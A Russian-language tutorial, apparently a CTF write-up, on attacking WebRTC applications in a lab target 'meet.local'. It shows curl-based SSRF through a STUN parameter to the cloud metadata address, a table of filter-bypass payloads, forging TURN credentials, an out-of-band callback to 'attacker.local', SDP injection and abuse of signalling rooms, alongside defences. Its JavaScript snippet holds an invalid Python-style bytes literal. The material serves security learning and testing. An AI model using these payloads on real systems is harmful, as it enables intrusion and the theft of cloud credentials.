## Вопрос, с которого всё начинается

Видеозвонки в браузере (Meet, Jitsi, чаты поддержки) работают на **WebRTC**. В отличие от WebSocket, WebRTC — не один протокол, а стек: он сам договаривается о соединении, пробивает NAT, шифрует медиа. И почти в каждом приложении есть серверная часть — **сигналинг** — которая обменивается параметрами соединения и конфигурирует ICE-серверы. Именно эта серверная часть часто уязвима.

## Наш пример

Есть `meet.local` — приложение с видеозвонками. Оно отдаёт браузеру конфигурацию ICE (STUN/TURN), которую берёт из параметра:

```bash
$ curl -s 'http://meet.local/api/ice?user=guest'
{"iceServers":[{"urls":["stun:stun.meet.local:3478"]}]}
```

Вопрос: что если параметр `stun` управляет адресом, к которому сервер обратится?

## Шаг 1: из чего состоит WebRTC

Три кита:

- **SDP (Session Description Protocol)** — текстовое описание сессии: какие кодеки, какие кандидаты (адреса) для соединения.
- **ICE (Interactive Connectivity Establishment)** — механизм пробивки NAT: перебирает «кандидатов» (локальные, STUN-публичные, TURN-релейные).
- **STUN/TURN** — серверы. STUN сообщает клиенту его публичный адрес; TURN — релей, который пересылает трафик, когда прямое соединение невозможно.

Сигналинг (обмен SDP и кандидатами) приложение делает само — обычно по WebSocket. Медиа идёт **P2P** и шифруется (DTLS-SRTP), а сигналинг — нет.

## Шаг 2: SSRF через конфигурацию ICE

Когда клиент передаёт список ICE-серверов, **браузер сам делает запрос** к STUN/TURN. Но если **сервер** формирует эту конфигурацию из пользовательского ввода и сам «пробует» адрес — получается SSRF:

```bash
$ curl -s 'http://meet.local/api/ice?user=guest&stun=169.254.169.254'
{"iceServers":[{"urls":["stun:169.254.169.254:3478"]}],
 "probe":"nto{turn_ssrf_t0_metadata}"}
```

Сервер обратился к `169.254.169.254` — это адрес **метаданных облака**. Если сервер «пробит» адрес и вернул результат, мы читаем метаданные, а оттуда — IAM-креды. Это классическая SSRF-цепочка, только вход — параметр STUN/TURN.

## Шаг 3: утечка IP

WebRTC исторически раскрывал **локальный IP** клиента через ICE-кандидатов: даже за NAT браузер перечисляет локальные адреса. Раньше это использовали для деанонимизации (например, за VPN). Сейчас браузеры ограничивают это (mDNS-кандидаты, разрешения), но в кастомных клиентах и в приложениях, которые **проксируют** ICE через сервер, утечка возвращается.

Ещё вектор — **SDP injection**: если сервер собирает SDP из пользовательских строк, атакующий может вставить лишние атрибуты (`a=candidate:...`) и подменить кандидата, направив соединение на свой хост.

## Шаг 4: data channels и сигналинг-сервер

WebRTC умеет не только медиа, но и **data channels** — произвольные бинарные каналы поверх SCTP/DTLS. Это значит: если атакующий контролирует одну из сторон (или внедрился в сигналинг), он получает канал для передачи данных в обход обычных HTTP-защит.

Сигналинг-сервер — самая уязвимая часть: он принимает произвольные сообщения (SDP, кандидаты, имена комнат) и ретранслирует их. Тут возможны:

- **неавторизованное подключение** к комнате (угадываемое имя) → подслушивание;
- **подмена SDP/кандидатов** → MITM или отказ в соединении;
- **SSRF через серверные ICE-probe**.

## Полный прогон от начала до конца

Находим `?stun=` — сервер сам конфигурирует ICE. Подставляем `169.254.169.254` — сервер обращается к метаданным и возвращает флаг. Дальше проверяем сигналинг: можно ли подключиться к комнате без авторизации, подменяются ли SDP-атрибуты. В отчёт идёт цепочка «параметр ICE → SSRF → метаданные → креды» и наблюдения по сигналингу.

## Если не сработало

Если сервер не «пробует» адрес сам, SSRF не выйдет — но конфигурация ICE всё равно может заставить **браузер жертвы** обратиться к внутреннему адресу (клиентский SSRF, слабее). Если STUN не подставляется, смотри другие поля SDP/кандидатов. Если приложение использует managed TURN (Twilio и т.п.), SSRF через URL может не пройти, но проверь **credentials** TURN — часто они долгоживущие. И помни: WebRTC требует HTTPS (secure context) — это не мешает серверной части.

## Что мы теперь знаем

- WebRTC = SDP + ICE + STUN/TURN, а сигналинг делает приложение.
- STUN/TURN-конфигурация из пользовательского ввода — это SSRF-поверхность.
- `169.254.169.254` за STUN-параметром ведёт к метаданным и кредам.
- ICE-кандидаты исторически утекают локальный IP.
- SDP injection позволяет подменить кандидатов и увести соединение.
- Сигналинг-сервер — главная цель: угадываемые комнаты, подмена сообщений.
- Data channels обходят обычные HTTP-защиты.

## Инструменты: перехват SDP и ICE

Первое, что нужно, — увидеть обмен сигналинга. В Chrome это `chrome://webrtc-internals`: там видны SDP offer/answer, все ICE-кандидаты и статистика.

```text
chrome://webrtc-internals → вызов → SDP
a=candidate:1 1 udp 2113937151 192.168.1.55 54321 typ host
a=candidate:2 1 udp 1677729535 203.0.113.7 54321 typ srflx
a=candidate:3 1 udp 41885439 198.51.100.9 49152 typ relay
```

`typ host` — локальный адрес (утечка!), `srflx` — публичный через STUN, `relay` — через TURN. На сервере сигналинг часто идёт по WebSocket — его удобно снимать Burp-прокси (проверь, что клиент не отвергает сертификат) или `tcpdump`.

```bash
$ sudo tcpdump -i any -n -A 'port 3478' | grep -i -E 'binding|username'
```

## Кейс: TURN с эфемерными кредами

Managed-TURN (Twilio, coturn с `use-auth-secret`) отдаёт клиенту **временные** креды, вычисляемые как HMAC-SHA1 от времени и секрета:

```bash
# coturn REST API: username = <timestamp>:<user>, password = base64(HMAC-SHA1(secret, username))
$ TTL=86400; TS=$(( $(date +%s) + TTL ))
$ USER="$TS:guest"
$ PASS=$(printf '%s' "$USER" | openssl dgst -binary -sha1 -hmac 'STATIC_SECRET' | base64)
$ curl -s "https://meet.local/api/turn?user=guest" | jq .
{"username":"1735689600:guest","credential":"...","urls":["turn:turn.meet.local:3478"]}
```

Атака: если TTL слишком большой, а секрет утёк (в JS, в `.env`, в репозитории), можно **самому** нагенерировать креды и релеить трафик через TURN — это обход сетевых ограничений и способ связаться с внутренними адресами (relay как pivot).

## SSRF-обходы фильтров ICE

Сервер, валидирующий `stun=`/`turn=` «по подстроке», обходится тривиально:

| Payload | Обходит |
|---|---|
| `stun:2130706433:3478` | десятичный IP (127.0.0.1) |
| `stun:0x7f000001:3478` | hex-IP |
| `stun:[::ffff:127.0.0.1]:3478` | IPv6-mapped |
| `stun:127.0.0.1.nip.io:3478` | DNS wildcard → 127.0.0.1 |
| `stun:attacker.local:3478` | DNS rebinding (TTL=0) |
| `turns:169.254.169.254:443` | TLS-вариант, часто не фильтруется |

DNS-rebinding особенно полезен: сервер резолвит имя в публичный IP при проверке, а при реальном probe получает уже внутренний.

## Утечка IP: почему и как

ICE-кандидаты `typ host` содержат **локальные** адреса интерфейсов — это историческая деанонимизация за VPN/прокси. Современные браузеры прячут их за mDNS (`*.local`) и требуют разрешения на камеру/микрофон, но утечка возвращается, если приложение:

- проксирует ICE через свой сервер (сервер видит host-кандидаты);
- использует свой «небраузерный» клиент (SDK, mobile);
- собирает SDP целиком и логирует/отдаёт его (SDP injection + логи).

## Сигналинг: атаки и защита

Сигналинг-сервер принимает произвольные сообщения и ретранслирует их. Типовые проблемы:

- **угадываемое имя комнаты** — подключение к чужому звонку без авторизации;
- **отсутствие привязки SDP к сессии** — подмена кандидатов (MITM);
- **отсутствие rate-limit** — спам-подключения, DoS;
- **SSRF через серверные ICE-probe** (наш основной вектор).

Защита: авторизация и токены на комнату, подпись SDP, валидация ICE-адресов по allow-list, короткоживущие TURN-креды.

## Что делать дальше / решение

Методика: (1) открыть `chrome://webrtc-internals`, зафиксировать SDP и кандидатов; (2) найти `?stun=`/`?turn=`/ICE-API и проверить, делает ли сервер запрос (SSRF); (3) протестировать обходы фильтра (таблица выше); (4) проверить TURN-креды — TTL и секрет; (5) проверить сигналинг на авторизацию комнат и подмену SDP; (6) оценить утечку IP. Защита: allow-list ICE-хостов, авторизация комнат, подписанные SDP, эфемерные TURN-креды с малым TTL.

## Справочная таблица

| Компонент | Роль | Риск |
|---|---|---|
| Сигналинг | обмен SDP/кандидатами | неавториз. доступ, подмена |
| STUN | узнать публичный адрес | SSRF (server-side probe) |
| TURN | релей трафика | SSRF, abuse кредов |
| ICE-кандидаты | адреса соединения | утечка локального IP |
| DataChannel | произвольные данные | обход HTTP-защит |

## Практический воркфлоу: SSRF через ICE-API

Полный проход от наблюдения к флагу:

```bash
# 1. Смотрим, как приложение отдаёт ICE-конфиг.
$ curl -s 'http://meet.local/api/ice?user=guest' | jq .
{"iceServers":[{"urls":["stun:stun.meet.local:3478"]}]}

# 2. Проверяем, управляет ли параметр адресом (server-side probe).
$ curl -s 'http://meet.local/api/ice?user=guest&stun=127.0.0.1:3478'
{"iceServers":[{"urls":["stun:127.0.0.1:3478"]}],"probe":"refused"}
# Разный probe на разные адреса = сервер реально ходит по введённому URL.

# 3. Идём в метаданные облака.
$ curl -s 'http://meet.local/api/ice?user=guest&stun=169.254.169.254:80'
{"probe":"nto{turn_ssrf_t0_metadata}"}
```

Если прямой `169.254.169.254` заблокирован, пробуй обходы из таблицы выше (decimal/hex IP, IPv6-mapped, DNS-rebinding). Для **слепого** случая используй OOB: `stun=attacker.local:3478` и слушай UDP/HTTP на своём хосте.

## Data channels как обход периметра

DataChannel поднимается поверх DTLS/SCTP **после** установки соединения. Если сигналинг позволяет атакующему стать участником звонка (угадал комнату, подменил SDP), он получает канал для передачи данных в обход корпоративного HTTP-прокси и DLP — трафик идёт по UDP к TURN/пиру, а не через inspectable HTTP.

```js
const dc = peer.createDataChannel('x');
dc.onopen = () => dc.send(b'...');   // произвольные байты, вне HTTP-инспекции
```

## Что делать дальше / решение

Приоритет — **серверный ICE-probe**: он даёт настоящий SSRF, а не клиентский. Подтверди, что сервер сам делает запрос (разные ответы на разные адреса), затем веди его к метаданным/внутренним сервисам. Параллельно проверь сигналинг (авторизация комнат, подмена SDP) и TURN-креды (TTL/секрет). Импакт документируй цепочкой «параметр ICE → запрос сервера → метаданные → IAM-креды».

## Куда дальше

WebRTC показал, что новые транспортные протоколы тянут за собой новые серверные компоненты (сигналинг, TURN), и каждый из них — поверхность. Дальше посмотрим на **WebAssembly** и **edge-вычисления** — там тот же принцип: новая платформа = новый код, который выполняется рядом с доверенными данными.

## Где пригодится

- **CTF (Web):** задачи на видеозвонки/чаты с WebRTC — SSRF через ICE.
- **Bug bounty:** SSRF через TURN/STUN-конфиг, неавторизованный сигналинг, утечка IP.
- **Пентест:** аудит приложений с видеосвязью (поддержка, телемедицина).
- **Работа (AppSec):** валидация ICE-адресов, авторизация комнат, короткоживущие TURN-креды.
